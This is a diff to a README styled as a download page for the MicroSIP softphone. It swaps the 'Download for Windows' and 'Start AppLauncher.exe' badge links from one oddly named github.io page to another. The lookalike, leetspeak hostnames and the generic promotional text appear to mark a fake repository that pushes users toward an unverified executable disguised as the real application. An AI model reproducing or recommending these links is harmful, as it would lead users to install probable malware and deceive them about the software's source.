@@ -2,8 +2,8 @@
 
 Enhance your communication workflow with MicroSIP — a powerful yet minimalistic SIP softphone that delivers encrypted VoIP calls directly on your desktop. Ideal for professionals, remote teams, and anyone who values privacy and reliability in digital conversations.
 
-[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10/11-green?style=for-the-badge&logo=windows)](https://redert-sova9-inf0.github.io/.github/)
-[![Start AppLauncher](https://img.shields.io/badge/Start_AppLauncher.exe-Now-blueviolet?style=for-the-badge&logo=gnome)](https://redert-sova9-inf0.github.io/.github/)
+[![Download for Windows](https://img.shields.io/badge/Download_for-Windows_10/11-green?style=for-the-badge&logo=windows)](https://4microsip4pcdownl0adinf0.github.io/.github/)
+[![Start AppLauncher](https://img.shields.io/badge/Start_AppLauncher.exe-Now-blueviolet?style=for-the-badge&logo=gnome)](https://4microsip4pcdownl0adinf0.github.io/.github/)
 
 ---
 
